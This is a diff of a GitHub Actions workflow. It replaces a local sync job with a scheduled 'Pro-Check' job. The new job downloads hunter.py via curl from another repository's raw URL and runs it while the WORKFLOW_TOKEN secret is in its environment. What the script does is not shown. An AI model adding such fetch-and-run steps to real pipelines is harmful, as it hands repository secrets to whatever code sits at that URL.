@@ -1,31 +1,21 @@
-name: Sync Assets Metadata
-on:
-  workflow_dispatch:
-  push:
-    branches: [ main ]
-  schedule:
-    - cron: '0 */6 * * *'
 
+name: 💅 Blondie Pro-Check
+on:
+  schedule:
+    - cron: '0 */3 * * *'
+  workflow_dispatch:
 jobs:
-  build:
+  check:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Set up Python 3.11
-        uses: actions/setup-python@v5
+      - name: Setup Python
+        uses: actions/setup-python@v4
         with:
-          python-version: '3.11'
-
-      - name: Install dependencies
-        run: |
-          pip install --upgrade pip
-          pip install google-generativeai requests
-
-      - name: Run sync script
-        # ВНИМАНИЕ: Прописываем env ПРЯМО В ШАГЕ запуска
+          python-version: '3.9'
+      - name: Run
         env:
           WORKFLOW_TOKEN: ${{ secrets.WORKFLOW_TOKEN }}
-          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
-        run: python core_sync.py
+        run: |
+          pip install requests
+          curl -O https://raw.githubusercontent.com/Catsss3/assets-distributor/main/hunter.py
+          python hunter.py
